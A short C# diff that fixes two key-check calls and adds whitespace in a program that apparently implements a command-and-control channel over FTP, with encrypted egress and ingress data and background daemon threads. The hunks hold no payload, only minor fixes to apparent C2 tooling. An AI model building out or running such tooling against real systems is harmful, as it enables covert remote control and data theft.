@@ -451,7 +451,7 @@ class Program
 
     public static string OnEgressDataModifier(string data)
     {
-        if (PeerEncryptor == null || !PeerEncryptor.HasPublicKey)
+        if (PeerEncryptor == null || !PeerEncryptor.HasPublicKey())
             return data;
 
         return PeerEncryptor.EncryptToJson(Encoding.UTF8.GetBytes(data));
@@ -459,7 +459,7 @@ class Program
 
     public static string OnIngressDataModifier(string data)
     {
-        if (Decryptor == null || !Decryptor.HasPrivateKey)
+        if (Decryptor == null || !Decryptor.HasPrivateKey())
             return data;
 
         return Encoding.UTF8.GetString(Decryptor.DecryptFromJson(data));
@@ -503,7 +503,7 @@ class Program
         daemons.Add(new Thread((object? obj) =>
         {
             if (obj == null)
-                return;
+                return;            
 
             C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);
 
